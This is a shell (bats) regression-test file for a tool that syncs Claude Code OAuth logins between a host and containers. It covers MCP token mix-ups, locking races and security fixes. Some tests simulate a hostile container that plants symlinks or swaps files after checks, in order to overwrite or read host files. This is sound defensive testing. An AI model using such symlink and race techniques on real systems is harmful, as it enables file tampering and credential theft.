    # Harvest: the box refreshed its login. Both copies hold the same MCP token.
    _mcp_cred_blob STALE $((now_ms + h)) $((now_ms + 24 * h)) > "$store"
    _mcp_cred_blob REFRESHED $((now_ms + 8 * h)) $((now_ms + 24 * h)) > "$box"
    run _account_sync_out "$cn"
    run cat "$store"
    assert_output --partial "sk-ant-oat01-REFRESHED"
    # Stage: the store holds the newer login, the box an older one whose MCP
    # token runs for a week.
    _mcp_cred_blob NEWER $((now_ms + 8 * h)) $((now_ms - 48 * h)) > "$store"
    _mcp_cred_blob OLDER $((now_ms + 2 * h)) $((now_ms + 168 * h)) > "$box"
    run _account_sync_in "$cn"
    run cat "$box"
    assert_output --partial "sk-ant-oat01-NEWER"
  done
}

@test "regression v1.4.3: the macOS re-seed keeps a box-refreshed login when an expired MCP login shares the file" {
  _is_macos() { return 0; }
  _macos_keychain_credentials() {
    printf '%s' '{"claudeAiOauth":{"accessToken":"KC-OLDER","refreshToken":"rt-kc","expiresAt":2000003600000}}'
  }
  local cred="$HOME/.claude/.credentials.json" leg order
  mkdir -p "$HOME/.claude"
  # now_ms 2e12. The box login is valid 7 h, its MCP entry expired 3 d ago and
  # the Keychain login is valid 1 h.
  local claude='"claudeAiOauth":{"accessToken":"BOX-REFRESHED","refreshToken":"rt-box","expiresAt":2000025200000,"scopes":["user:inference"],"subscriptionType":"max"}'
  local mcp='"mcpOAuth":{"linear|0123456789abcdef":{"serverName":"linear","serverUrl":"https://mcp.linear.app/mcp","accessToken":"MCP-LOGIN","refreshToken":"mcp-rt","expiresAt":1999740800000,"scope":"read write"}}'
  for leg in jq nojq; do
    [ "$leg" = nojq ] && _hide_jq
    for order in claude-first mcp-first; do
      if [ "$order" = claude-first ]; then
        printf '{%s,%s}' "$claude" "$mcp" > "$cred"
      else
        printf '{%s,%s}' "$mcp" "$claude" > "$cred"
      fi
      _SEEDED_CREDS=0
      _CLEAT_NOW_S=2000000000 _seed_macos_credentials
      run cat "$cred"
      assert_output --partial "BOX-REFRESHED"
      assert_output --partial "MCP-LOGIN"
      refute_output --partial "KC-OLDER"
      assert_equal "$leg $order $_SEEDED_CREDS" "$leg $order 0"
    done
  done
}

@test "regression v1.4.3: an unreadable shared credential file does not abort the macOS launch" {
  # The seed runs bare in exec_claude under set -e. Its read of the shared file
  # was a redirect. A redirect that cannot open the file fails the whole
  # assignment, so `cleat` exited before Claude started with nothing but a raw
  # "Permission denied". Sourced tests strip strict mode, so this one puts it back.
  [ "$(id -u)" != "0" ] || skip "root reads a mode-000 file"
  mkdir -p "$HOME/.claude"
  printf '{"claudeAiOauth":{"accessToken":"a","expiresAt":1}}' > "$HOME/.claude/.credentials.json"
  chmod 000 "$HOME/.claude/.credentials.json"
  run bash -c 'set -euo pipefail; source "$1"; set -euo pipefail
    _is_macos() { return 0; }
    _macos_keychain_credentials() { return 1; }
    _seed_macos_credentials
    echo "launch continues"' _ "$CLI"
  chmod 600 "$HOME/.claude/.credentials.json"
  assert_success
  assert_output --partial "launch continues"
  refute_output --partial "Permission denied"
}

@test "regression v1.4.3: macOS seed never writes the token through a planted temp symlink" {
  # ~/.claude is mounted read-write into every box. The seed wrote the Keychain
  # login to "$cred.tmp.$$", a name a box can guess, through a bare `>` that
  # follows a symlink. A box that planted one there had the live login written
  # onto any host file the user can write. The mv then made the credential
  # file itself a link to it.
  _is_macos() { return 0; }
  # seed_blob and not blob: the CLI's own `local blob` would shadow it.
  local seed_blob='{"claudeAiOauth":{"accessToken":"sk-ant-oat01-KEYCHAIN","refreshToken":"rt","expiresAt":3000000000000}}'
  _macos_keychain_credentials() { printf '%s' "$seed_blob"; }
  local cred="$HOME/.claude/.credentials.json" victim="$TEST_TEMP/precious-host-file" leg
  mkdir -p "$HOME/.claude"
  printf 'DO-NOT-OVERWRITE\n' > "$victim"
  chmod 644 "$victim"
  ln -s "$victim" "${cred}.tmp.$$"
  for leg in jq nojq; do
    [ "$leg" = nojq ] && _hide_jq
    : > "$cred"
    _SEEDED_CREDS=0
    _seed_macos_credentials
    run cat "$victim"
    assert_output "DO-NOT-OVERWRITE"
    [ ! -L "$cred" ] || { echo "$leg: the credential file became a symlink"; return 1; }
    run cat "$cred"
    assert_output "$seed_blob"
    assert_equal "$leg $_SEEDED_CREDS" "$leg 1"
  done
}

# ─────────────────────────────────────────────────────────────────────────────
# v1.5.0: the credential readers were not scoped to the Claude login. With jq
# they took the first accessToken or refreshToken anywhere in the file and
# without jq the last. Claude Code 2.1.270 keeps each MCP server's OAuth tokens
# in the same file under mcpOAuth. It writes that key BEFORE claudeAiOauth when
# the MCP login came first and AFTER it otherwise. So the order of two logins,
# not their meaning, picked the token. On a jq host the usage poll sent the MCP
# server's bearer to api.anthropic.com. On a jq-less host a blanked Claude login
# beside a live MCP entry read as plausible and was harvested over the account's
# only good credential, with no trash and no undo.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v1.5.0: the usage poll sends the account's own bearer, never a coresident MCP token" {
  command -v jq >/dev/null || skip "the usage poll needs jq"
  CLEAT_ACCOUNTS_DIR="$TEST_TEMP/home/.config/cleat/accounts"
  mkdir -p "$CLEAT_ACCOUNTS_DIR"
  _CLEAT_NOW_S=1789000000
  local exp=1789007200000 order acct
  local claude="\"claudeAiOauth\":{\"accessToken\":\"sk-ant-oat01-ACCOUNT-OWN\",\"refreshToken\":\"sk-ant-ort01-ACCOUNT-OWN\",\"expiresAt\":$exp,\"scopes\":[\"user:inference\",\"user:profile\"],\"subscriptionType\":\"max\"}"
  local mcp="\"mcpOAuth\":{\"linear|0123456789abcdef\":{\"serverName\":\"linear\",\"serverUrl\":\"https://mcp.linear.app/mcp\",\"accessToken\":\"MCP-SERVER-TOKEN\",\"refreshToken\":\"MCP-SERVER-REFRESH\",\"expiresAt\":1789086400000,\"scope\":\"read write\"}}"
  # Both orders, so a reader that takes the first match anywhere and one that
  # takes the last each fail one of them.
  for order in cm mc; do
    acct="acct-$order"
    _account_ensure_dir "$acct"
    if [ "$order" = cm ]; then
      printf '{%s,%s}' "$claude" "$mcp" > "$(_account_cred_path "$acct")"
    else
      printf '{%s,%s}' "$mcp" "$claude" > "$(_account_cred_path "$acct")"
    fi
    curl() {
      cat > "$TEST_TEMP/curl-$order.cfg"
      printf '{"five_hour":{"utilization":10,"resets_at":"2026-09-13T20:00:00Z"},"seven_day":{"utilization":20,"resets_at":"2026-09-15T20:00:00Z"}}'
    }
    run _account_usage_fetch "$acct"
    assert_success
    run cat "$TEST_TEMP/curl-$order.cfg"
    assert_output --partial "Authorization: Bearer sk-ant-oat01-ACCOUNT-OWN\""
    refute_output --partial "MCP-SERVER"
  done
}

@test "regression v1.5.0: a jq-less host does not harvest a blanked login over a good store" {
  _hide_jq
  CLEAT_ACCOUNTS_DIR="$TEST_TEMP/home/.config/cleat/accounts"
  CLEAT_BOX_ACCOUNTS_DIR="$TEST_TEMP/home/.config/cleat/box-accounts"
  CLEAT_RUN_DIR="$TEST_TEMP/home/.config/cleat/run"
  mkdir -p "$CLEAT_ACCOUNTS_DIR" "$CLEAT_BOX_ACCOUNTS_DIR" "$CLEAT_RUN_DIR"
  _CLEAT_NOW_S=1789000000
  curl() { cat >/dev/null 2>&1; return 7; }
  local cn="cleat-proj-abcdef12" store box order
  _box_account_write "$cn" work
  _account_ensure_dir work
  store="$(_account_cred_path work)"
  box="$(_account_box_auth_dir "$cn")/.credentials.json"
  mkdir -p "${box%/*}"
  # The login invalid_grant blanked beside a live MCP entry. Its expiry reads
  # newer, which a box can always write, so only the plausibility of the Claude
  # login's own tokens stands between it and the store. The report's case is cm
  # (the MCP entry written after the login). mc fails a first-match reader.
  local blanked='"claudeAiOauth":{"accessToken":"","refreshToken":"","expiresAt":1789007200000,"scopes":["user:inference"],"subscriptionType":"max"}'
  local mcp='"mcpOAuth":{"labmcp|cda6d80a97111f6e":{"serverName":"labmcp","serverUrl":"http://127.0.0.1:36963/mcp","accessToken":"FAKE-MCP-at-1","clientId":"lab-mcp-client","refreshToken":"FAKE-MCP-rt-1","expiresAt":1789086400000,"scope":"read"}}'
  for order in cm mc; do
    printf '{"claudeAiOauth":{"accessToken":"sk-ant-oat01-GOOD","refreshToken":"sk-ant-ort01-GOOD","expiresAt":1789003600000,"subscriptionType":"max"}}' > "$store"
    if [ "$order" = cm ]; then
      printf '{%s,%s}' "$blanked" "$mcp" > "$box"
    else
      printf '{%s,%s}' "$mcp" "$blanked" > "$box"
    fi
    run _account_sync_out "$cn"
    assert_equal "$order $status" "$order 1"
    run cat "$store"
    assert_output --partial '"refreshToken":"sk-ant-ort01-GOOD"'
    refute_output --partial "FAKE-MCP"
  done
}

# ─────────────────────────────────────────────────────────────────────────────
# v1.5.0: nothing serialised the account code across cleat processes. Every
# account path read a pin, a store and a staged credential, decided and wrote,
# and two terminals interleaved. An attach that had read pin a staged a's login
# over the b a concurrent switch had just staged (5 in 100 natural runs), so the
# box ran as a while pinned to b. A session-end harvest wrote b's credential
# into a's store. An attach that read the pin between a rename's move and its
# pin rewrite found no store and deleted the staged login. And the harvest read
# the staged path again at write time, so bytes the box wrote after the checks
# (a blanked login, or a symlink to any host file the user can read) went into
# the store unchecked.
#
# Each race is made deterministic the same way. A function that runs INSIDE the
# critical section under test is wrapped so that its first call starts the
# competing command in the background, then waits until that command has either
# finished or is waiting on the account lock (_account_lock_pause). With no lock
# the competitor always finishes first and the interleaving that corrupted the
# store is replayed exactly. With the lock it can only be waiting. The sleeps
# are poll intervals. None of them decides an outcome.
#
# Fixtures follow the account fixture convention: accessToken carries the
# generation (at-A1) and refreshToken the grant (rt-A).
# ─────────────────────────────────────────────────────────────────────────────
_acct_race_setup() {
  CLEAT_ACCOUNTS_DIR="$TEST_TEMP/home/.config/cleat/accounts"
  CLEAT_BOX_ACCOUNTS_DIR="$TEST_TEMP/home/.config/cleat/box-accounts"
  CLEAT_RUN_DIR="$TEST_TEMP/home/.config/cleat/run"
  CLEAT_PROJECTS_DIR="$TEST_TEMP/home/.config/cleat/projects"
  mkdir -p "$CLEAT_ACCOUNTS_DIR" "$CLEAT_BOX_ACCOUNTS_DIR" "$CLEAT_RUN_DIR" "$CLEAT_PROJECTS_DIR"
  _CLEAT_NOW_S=1789000000
  _has_unicode() { return 1; }
  _daemon_up() { return 1; }
  container_exists() { return 1; }
  _box_has_live_agent() { return 1; }
  # A switch away from a pinned account polls usage. Never the real network.
  curl() { cat >/dev/null 2>&1; return 7; }
  _ACCOUNT_LOCK_WAIT_S=60
}

# $1 file, $2 grant, $3 generation, $4 expiresAt (epoch ms)
_acct_race_cred() {
  mkdir -p "${1%/*}"
  printf '{"claudeAiOauth":{"accessToken":"at-%s%s","refreshToken":"rt-%s","expiresAt":%s,"subscriptionType":"max"}}\n' "$2" "$3" "$2" "$4" > "$1"
  chmod 600 "$1"
}

_acct_race_start() {
  _account_lock_pause() { : > "$TEST_TEMP/race.waiting"; sleep 0.05; }
  # The competitor holds nothing: the lock depth this shell inherits at the
  # fork belongs to the holder.
  ( _ACCOUNT_LOCK_DEPTH=0; "$@" > "$TEST_TEMP/race.out" 2>&1; : > "$TEST_TEMP/race.done" ) 3>&- &
  _ACCT_RACE_PID=$!
  local i=0
  while [[ ! -e "$TEST_TEMP/race.waiting" && ! -e "$TEST_TEMP/race.done" && $i -lt 1200 ]]; do
    sleep 0.05
    i=$(( i + 1 ))
  done
}

# _acct_race_on FUNCTION COMMAND...: the first call of FUNCTION starts COMMAND.
_acct_race_on() {
  local fn="$1"
  shift
  _ACCT_RACE_CMD=("$@")
  eval "$(declare -f "$fn" | sed "1s/^$fn /_acct_race_orig_$fn /")"
  eval "$fn() {
    if [[ ! -e \"\$TEST_TEMP/race.hooked\" ]]; then
      : > \"\$TEST_TEMP/race.hooked\"
      _acct_race_start \"\${_ACCT_RACE_CMD[@]}\"
    fi
    _acct_race_orig_$fn \"\$@\"
  }"
}

_acct_race_joined() {
  run test -e "$TEST_TEMP/race.hooked"
  assert_success
  wait "$_ACCT_RACE_PID"
}

@test "regression v1.5.0: an attach cannot stage the old account after a concurrent switch pinned the new one" {
  _acct_race_setup
  local CN="cleat-race-abcdef12" staged
  staged="$CLEAT_RUN_DIR/$CN/auth/.credentials.json"
  # Another box refreshed a since this one ran, so the attach has something to stage.
  _acct_race_cred "$CLEAT_ACCOUNTS_DIR/a/.credentials.json" A 2 1789032400000
  _acct_race_cred "$CLEAT_ACCOUNTS_DIR/b/.credentials.json" B 0 1789025200000
  _acct_race_cred "$staged" A 1 1789028800000
  _box_account_write "$CN" a
  _acct_race_on _account_write_file_0600 _account_do_switch b main "$CN" "$TEST_TEMP/proj"
  _account_sync_in "$CN" || true
  _acct_race_joined
  run _box_account_read "$CN"
  assert_output "b"
  run cat "$staged"
  assert_output --partial '"accessToken":"at-B0"'
}

@test "regression v1.5.0: an attach during the unpin and staging of a switch waits, then stages the new account" {
  # The other half of the switch's hold. The switch has harvested and is about
  # to pin b and stage it. A switch that let go of the lock after its harvest
  # let the attach read pin a and decide to stage a's newer login. Once that
  # write lands after the switch's own staging, the box runs as a while pinned
  # to b and the next session end harvests a's login into b's store. The switch
  # stages b whatever the staged expiry says, so an attach write that lands
  # BEFORE it is simply replaced. The attach here is held at its write until
  # the switch has returned, as a slower one would be.
  _acct_race_setup
  local CN="cleat-race-abcdef12" staged
  staged="$CLEAT_RUN_DIR/$CN/auth/.credentials.json"
  _acct_race_cred "$CLEAT_ACCOUNTS_DIR/a/.credentials.json" A 2 1789032400000
  _acct_race_cred "$CLEAT_ACCOUNTS_DIR/b/.credentials.json" B 0 1789025200000
  _acct_race_cred "$staged" A 1 1789028800000
  _box_account_write "$CN" a
  _acct_slow_attach() {
    eval "$(declare -f _account_write_file_0600 | sed '1s/^_account_write_file_0600 /_acct_attach_orig_write /')"
    _account_write_file_0600() {
      : > "$TEST_TEMP/race.waiting"
      local i=0
      while [[ ! -e "$TEST_TEMP/switch.done" && $i -lt 1200 ]]; do
        sleep 0.05
        i=$(( i + 1 ))
      done
      _acct_attach_orig_write "$@"
    }
    _account_sync_in "$@"
  }
  # The switch writes the pin right after its harvest.
  _acct_race_on _box_account_write _acct_slow_attach "$CN"
  _account_do_switch b main "$CN" "$TEST_TEMP/proj" > /dev/null 2>&1 || true
  : > "$TEST_TEMP/switch.done"
  _acct_race_joined
  run _box_account_read "$CN"
  assert_output "b"
  run cat "$staged"
  assert_output --partial '"accessToken":"at-B0"'
}

@test "regression v1.5.0: a session-end harvest cannot write the new account into the old account's store" {
  # The harvest decided on a's refreshed login, a switch then harvested, pinned b
  # and staged b, and the harvest wrote the staged file as it was by then: b's
  # credential into a's store. The box refreshing again inside that window is
  # replayed too, so a harvest that only wrote its own earlier copy would still
  # roll a back to the older generation.
  _acct_race_setup
  local CN="cleat-race-abcdef12" staged
  staged="$CLEAT_RUN_DIR/$CN/auth/.credentials.json"
  _acct_race_cred "$CLEAT_ACCOUNTS_DIR/a/.credentials.json" A 0 1789003600000
  _acct_race_cred "$CLEAT_ACCOUNTS_DIR/b/.credentials.json" B 0 1789025200000
  _acct_race_cred "$staged" A 1 1789028800000
  _box_account_write "$CN" a
  # The window opens at the write: the harvest has read both expiries and
  # decided. (The plausibility check runs before that decision, so a hook there
  # would let the harvest see the switch's store and decline instead.)
  eval "$(declare -f _account_write_cred | sed '1s/^_account_write_cred /_acct_race_orig_write_cred /')"
  _account_write_cred() {
    if [[ ! -e "$TEST_TEMP/race.hooked" ]]; then
      : > "$TEST_TEMP/race.hooked"
      _acct_race_cred "$staged" A 2 1789032400000
      _acct_race_start _account_do_switch b main "$CN" "$TEST_TEMP/proj"
    fi
    _acct_race_orig_write_cred "$@"
  }
  _account_sync_out "$CN" || true
  _acct_race_joined
  run cat "$CLEAT_ACCOUNTS_DIR/a/.credentials.json"
  assert_output --partial '"accessToken":"at-A2"'
  run cat "$CLEAT_ACCOUNTS_DIR/b/.credentials.json"
  assert_output --partial '"accessToken":"at-B0"'
}

@test "regression v1.5.0: an attach during a rename stages from the renamed store" {
  # The rename moves the store before it rewrites the pins. An attach that read
  # the pin in between found no store and removed the box's credential (16 of 63
  # in the band). The store also holds a newer refresh than the box, the way
  # another box pinned to the same account leaves it, so an attach that merely
  # keeps what is staged still fails.
  _acct_race_setup
  local CN="cleat-race-abcdef12" staged
  staged="$CLEAT_RUN_DIR/$CN/auth/.credentials.json"
  _acct_race_cred "$CLEAT_ACCOUNTS_DIR/a/.credentials.json" A 2 1789032400000
  _acct_race_cred "$staged" A 1 1789028800000
  _box_account_write "$CN" a
  _acct_race_on _box_account_write _account_sync_in "$CN"
  _account_rename a c || true
  _acct_race_joined
  run _box_account_read "$CN"
  assert_output "c"
  run cat "$staged"
  assert_output --partial '"accessToken":"at-A2"'
}

@test "regression v1.5.0: a box pinned while its account is being removed is never left on a store that is gone" {
  # remove read the pinned boxes, a switch then pinned another box to the same
  # account and the trash took the store from under it. That box's next attach
  # found no store and deleted its staged login.
  _acct_race_setup
  local CN="cleat-race-abcdef12" CN2="cleat-race-abcdef13"
  _acct_race_cred "$CLEAT_ACCOUNTS_DIR/a/.credentials.json" A 1 1789028800000
  _acct_race_cred "$CLEAT_RUN_DIR/$CN/auth/.credentials.json" A 1 1789028800000
  _box_account_write "$CN" a
  _acct_race_on _account_trash _account_do_switch a main "$CN2" "$TEST_TEMP/proj"
  _account_do_remove a 1 > /dev/null 2>&1 || true
  _acct_race_joined
  run _box_account_read "$CN2"
  assert_output "a"
  run _account_exists a
  assert_success
}

@test "regression v1.5.0: a harvest writes only the bytes it checked, never what the box swaps in afterwards" {
  # The harvest read the staged path for the expiry, again for the token check
  # and again for the copy. Claude blanks both tokens in that file on
  # invalid_grant, and a blank that landed after the check went over the
  # account's only good refresh token. A symlink swapped in after the check had
  # the host-side copy read a host file into the store, and the next attach
  # handed it to the box.
  _acct_race_setup
  local CN="cleat-race-abcdef12" staged store secret leg
  staged="$CLEAT_RUN_DIR/$CN/auth/.credentials.json"
  store="$CLEAT_ACCOUNTS_DIR/a/.credentials.json"
  secret="$TEST_TEMP/host-secret.json"
  # A JSON object, because only a JSON object survives the write's validation.
  printf '{"aws_secret_access_key":"FAKE-HOST-SECRET"}\n' > "$secret"
  _box_account_write "$CN" a
  eval "$(declare -f _account_cred_plausible | sed '1s/^_account_cred_plausible /_acct_orig_plausible /')"
  _account_cred_plausible() {
    local rc=0
    _acct_orig_plausible "$@" || rc=$?
    if [[ "$_ACCT_SWAP_LEG" == blank ]]; then
      printf '{"claudeAiOauth":{"accessToken":"","refreshToken":"","expiresAt":0}}\n' > "$staged"
    else
      rm -f "$staged"
      ln -s "$secret" "$staged"
    fi
    return "$rc"
  }
  for leg in blank symlink; do
    _ACCT_SWAP_LEG="$leg"
    _acct_race_cred "$store" A 0 1789003600000
    rm -f "$staged"
    _acct_race_cred "$staged" A 1 1789028800000
    run _account_sync_out "$CN"
    assert_equal "$leg $status" "$leg 0"
    run cat "$store"
    assert_output --partial '"accessToken":"at-A1"'
    refute_output --partial "FAKE-HOST-SECRET"
    # The box drops what it planted and attaches again.
    rm -f "$staged"
    run _account_sync_in "$CN"
    run cat "$staged"
    refute_output --partial "FAKE-HOST-SECRET"
    assert_output --partial '"accessToken":"at-A1"'
  done
}

@test "regression v1.5.0: a switch that cannot take the account lock changes nothing" {
  # A timeout must never fall through to an unlocked write or delete.
  _acct_race_setup
  local CN="cleat-race-abcdef12" staged
  staged="$CLEAT_RUN_DIR/$CN/auth/.credentials.json"
  _acct_race_cred "$CLEAT_ACCOUNTS_DIR/a/.credentials.json" A 1 1789028800000
  _acct_race_cred "$CLEAT_ACCOUNTS_DIR/b/.credentials.json" B 0 1789025200000
  _acct_race_cred "$staged" A 1 1789028800000
  _box_account_write "$CN" a
  mkdir -p "$CLEAT_ACCOUNTS_DIR/.lock"
  printf 'host %s pid %s at %s\n' "${HOSTNAME:-unknown}" "$$" "$(date +%s)" > "$CLEAT_ACCOUNTS_DIR/.lock/owner"
  _ACCOUNT_LOCK_WAIT_S=0
  run _account_do_switch b main "$CN" "$TEST_TEMP/proj"
  assert_failure
  assert_output --partial "Another cleat command is changing accounts right now."
  assert_output --partial "Nothing was changed"
  run _box_account_read "$CN"
  assert_output "a"
  run cat "$staged"
  assert_output --partial '"accessToken":"at-A1"'
}

# ─────────────────────────────────────────────────────────────────────────────
# v1.5.0: the live-session refusal gave a reason Claude Code 2.1.270 does not
# have. The switch said "Swapping the credential under a running session is
# noticed and undone", from a 2.1.267 read that was never run, and the remove
# gave no reason at all. On 2.1.270 the store's mtime change only clears caches:
# the next request goes out on whatever token is there and nothing is written
# back (77 lab runs). The refusal stays, because a running session keeps the
# store path, the account identity and any turn in flight from its start. All
# three refusals now say that.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v1.5.0: a live-session refusal never claims Claude Code undoes the swap" {
  CLEAT_ACCOUNTS_DIR="$TEST_TEMP/home/.config/cleat/accounts"
  CLEAT_BOX_ACCOUNTS_DIR="$TEST_TEMP/home/.config/cleat/box-accounts"
  CLEAT_RUN_DIR="$TEST_TEMP/home/.config/cleat/run"
  CLEAT_PROJECTS_DIR="$TEST_TEMP/home/.config/cleat/projects"
  mkdir -p "$CLEAT_ACCOUNTS_DIR/work" "$CLEAT_BOX_ACCOUNTS_DIR" "$CLEAT_RUN_DIR" "$CLEAT_PROJECTS_DIR"
  printf '{"claudeAiOauth":{"accessToken":"at-FAKE","refreshToken":"rt-FAKE","expiresAt":1}}\n' > "$CLEAT_ACCOUNTS_DIR/work/.credentials.json"
  local cn="cleat-proj-abcdef12"
  _daemon_up() { return 0; }
  container_exists() { return 0; }
  is_running() { return 0; }
  _box_has_live_agent() { return 0; }
  # Shared login to a named one.
  run _account_do_switch work main "$cn" "$TEST_TEMP/proj"
  assert_failure
  refute_output --partial "undone"
  assert_output --partial "only takes a login change in full when it starts"
  # A named one back to the shared login.
  _box_account_write "$cn" work
  run _account_do_switch default main "$cn" "$TEST_TEMP/proj"
  assert_failure
  refute_output --partial "undone"
  assert_output --partial "only takes a login change in full when it starts"
  # Removing the account a live box is pinned to.
  run _account_do_remove work 1
  assert_failure
  assert_output --partial "only takes a login change in full when it starts"
  run _account_exists work
  assert_success
  run _box_account_read "$cn"
  assert_output "work"
}

# ─────────────────────────────────────────────────────────────────────────────
# v1.5.0: account rm asked whether a pinned box had a live session only BEFORE
# its "Remove it? [y/N]" question, which can stay on screen indefinitely. A
# session started while it waited had its staged login deleted after the yes,
# and Claude printed "Not logged in" into it.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v1.5.0: account rm asks again whether a session is live after its question" {
  _acct_race_setup
  local cn="cleat-proj-abcdef12" staged
  staged="$CLEAT_RUN_DIR/$cn/auth/.credentials.json"
  _acct_race_cred "$CLEAT_ACCOUNTS_DIR/work/.credentials.json" W 1 1789028800000
  _acct_race_cred "$staged" W 1 1789028800000
  _box_account_write "$cn" work
  _daemon_up() { return 0; }
  container_exists() { return 0; }
  is_running() { return 0; }
  _box_has_live_agent() { [ -e "$TEST_TEMP/session-started" ]; }
  _is_interactive() { return 0; }
  # The session starts while the question is on screen.
  _ask_yn() { : > "$TEST_TEMP/session-started"; printf -v "$1" '%s' y; }
  run _account_do_remove work 0
  assert_failure
  assert_output --partial "only takes a login change in full when it starts"
  refute_output --partial "Removed"
  run _account_exists work
  assert_success
  run _box_account_read "$cn"
  assert_output "work"
  run cat "$staged"
  assert_output --partial '"accessToken":"at-W1"'
}

# ─────────────────────────────────────────────────────────────────────────────
# v1.5.0: a switch polled the outgoing account's usage (up to 3 s of curl)
# between its harvest and the staging of the incoming login. A refresh the box
# saved in that window was deleted by the staging without ever being harvested.
# The poll now runs after the staging and outside the account lock.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v1.5.0: a switch finishes staging before it waits on the usage API" {
  _acct_race_setup
  local CN="cleat-race-abcdef12" staged
  staged="$CLEAT_RUN_DIR/$CN/auth/.credentials.json"
  _acct_race_cred "$CLEAT_ACCOUNTS_DIR/old/.credentials.json" O 1 1789028800000
  _acct_race_cred "$CLEAT_ACCOUNTS_DIR/new/.credentials.json" N 0 1789025200000
  _acct_race_cred "$staged" O 1 1789028800000
  _box_account_write "$CN" old
  eval "$(declare -f _account_sync_in_locked | sed '1s/^_account_sync_in_locked /_acct_orig_sync_in_locked /')"
  _account_sync_in_locked() { echo "stage" >> "$TEST_TEMP/order"; _acct_orig_sync_in_locked "$@"; }
  _account_usage_fetch() {
    if grep -q '"accessToken":"at-N0"' "$staged" 2>/dev/null; then
      echo "usage staged=new" >> "$TEST_TEMP/order"
    else
      echo "usage staged=old" >> "$TEST_TEMP/order"
    fi
    return 1
  }
  run _account_do_switch new main "$CN" "$TEST_TEMP/proj"
  assert_success
  run cat "$TEST_TEMP/order"
  # The first line is the staging, and every usage request found the new login
  # already staged.
  assert_line --index 0 "stage"
  assert_output --partial "usage staged=new"
  refute_output --partial "usage staged=old"
}

# ─────────────────────────────────────────────────────────────────────────────
# v1.5.0: writers that created an account, and an attach that deleted a login.
#
# The harvest and the metadata writer both began with a mkdir -p of the store,
# so one that finished after `cleat account rm` in another terminal put the
# account back under its old name, and `restore` then refused. Only the
# explicit switch to a new name creates a store now.
#
# The attach removed the staged credential whenever the account store was
# empty. A /login made inside a pinned box lives only in that file until a
# session end harvests it, and `cleat shell` and `cleat login` never do, so the
# next attach threw the login away and the Claude still running on it printed
# "Not logged in". The attach harvests instead and stages nothing back.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v1.5.0: a session-end harvest that loses the race with account rm does not recreate the account" {
  _acct_race_setup
  local CN="cleat-race-abcdef12"
  # With the store gone the harvest no longer sees the same grant, so the server
  # is asked, and it vouches: the harvest reaches its write.
  _acct_ident_profile "$_ACCT_UUID_A" a@example.com
  _acct_race_cred "$CLEAT_ACCOUNTS_DIR/a/.credentials.json" A 0 1789003600000
  _acct_race_cred "$CLEAT_RUN_DIR/$CN/auth/.credentials.json" A 1 1789007200000
  _box_account_write "$CN" a
  # The remove lands where the lab's stalled session end sat: after the harvest
  # decided, before it wrote. It runs in-process, nested in the harvest's hold.
  eval "$(declare -f _account_cred_plausible | sed '1s/^_account_cred_plausible /_acct_orig_plausible /')"
  _account_cred_plausible() {
    if [[ ! -e "$TEST_TEMP/rm.done" ]]; then
      : > "$TEST_TEMP/rm.done"
      _account_do_remove a 1 > /dev/null 2>&1 || true
    fi
    _acct_orig_plausible "$@"
  }
  _account_sync_out "$CN" || true
  run test -e "$TEST_TEMP/rm.done"
  assert_success
  run test -e "$CLEAT_ACCOUNTS_DIR/a"
  assert_failure
  run _account_do_restore a
  assert_success
  # What comes back is the remove's own harvest of the box's refresh.
  run cat "$CLEAT_ACCOUNTS_DIR/a/.credentials.json"
  assert_output --partial '"accessToken":"at-A1"'
}

@test "regression v1.5.0: an unharvested login in a pinned box survives the next attach while its account store is empty" {
  _acct_race_setup
  _account_box_ready() { return 0; }
  local mode cn staged store
  # The store has no refresh token to match, so the server names the login.
  _acct_ident_profile "$_ACCT_UUID_A" in-box@example.com
  for mode in jq nojq; do
    [[ "$mode" == nojq ]] && _hide_jq
    cn="cleat-login-$mode"
    _account_ensure_dir "fresh-$mode"
    _box_account_write "$cn" "fresh-$mode"
    staged="$(_account_box_auth_dir "$cn")/.credentials.json"
    store="$(_account_cred_path "fresh-$mode")"
    mkdir -p "${staged%/*}"
    # What claude /login inside the box wrote.
    printf '{"claudeAiOauth":{"accessToken":"at-in-box","refreshToken":"rt-in-box-%s","expiresAt":1789028800000,"subscriptionType":"max"}}\n' "$mode" > "$staged"
    ln "$staged" "$TEST_TEMP/staged-$mode.link"
    CLAUDE_ENV=()
    run _account_apply_exec_env "$cn"
    assert_success
    # Same inode: the file the running Claude reads was neither removed nor
    # replaced.
    run test "$staged" -ef "$TEST_TEMP/staged-$mode.link"
    assert_success
    run grep -c "rt-in-box-$mode" "$staged"
    assert_output "1"
    # And it is harvested, so a sibling box on the same account gets it.
    run grep -c "rt-in-box-$mode" "$store"
    assert_output "1"
  done
  unset -f command
  # Offline, the login cannot be verified. It is still never deleted: the harvest
  # says cannot tell (3) and the attach leaves the file as it is.
  _account_profile_curl() { printf '\n000'; }
  cn="cleat-login-offline"
  _account_ensure_dir fresh-offline
  _box_account_write "$cn" fresh-offline
  staged="$(_account_box_auth_dir "$cn")/.credentials.json"
  mkdir -p "${staged%/*}"
  printf '{"claudeAiOauth":{"accessToken":"at-in-box","refreshToken":"rt-in-box-offline","expiresAt":1789028800000,"subscriptionType":"max"}}\n' > "$staged"
  ln "$staged" "$TEST_TEMP/staged-offline.link"
  run _account_sync_out "$cn"
  assert_equal "$status" 3
  CLAUDE_ENV=()
  run _account_apply_exec_env "$cn"
  assert_success
  run test "$staged" -ef "$TEST_TEMP/staged-offline.link"
  assert_success
  run grep -c "rt-in-box-offline" "$staged"
  assert_output "1"
  run test -s "$(_account_cred_path fresh-offline)"
  assert_failure
}

# ─────────────────────────────────────────────────────────────────────────────
# v1.5.0: every deleter trusted a declined harvest.
#
# The harvest returned 0 both when the store already held the staged login and
# when it simply declined a file that was not newer. `cleat rm`, both switches,
# `cleat account rm` and nuke then deleted the staged file. A /login made in the
# box as someone else behind a sibling box's fresher refresh, or a refresh whose
# store write failed, existed nowhere afterwards. A declined login the store
# does not hold is now status 3, and every deleter copies what the harvest did
# not take to accounts/.held first, or deletes nothing.
#
# The same wipes only ever looked at the one staged file of a pinned box. Any
# other credential in run/<cname>/ (a staged file an unpinned box was left with,
# a rollback journal) went with the directory. They are held first too.
#
# Fixtures follow the account fixture convention: accessToken carries the
# generation (at-W5) and refreshToken the grant (rt-W).
# ─────────────────────────────────────────────────────────────────────────────
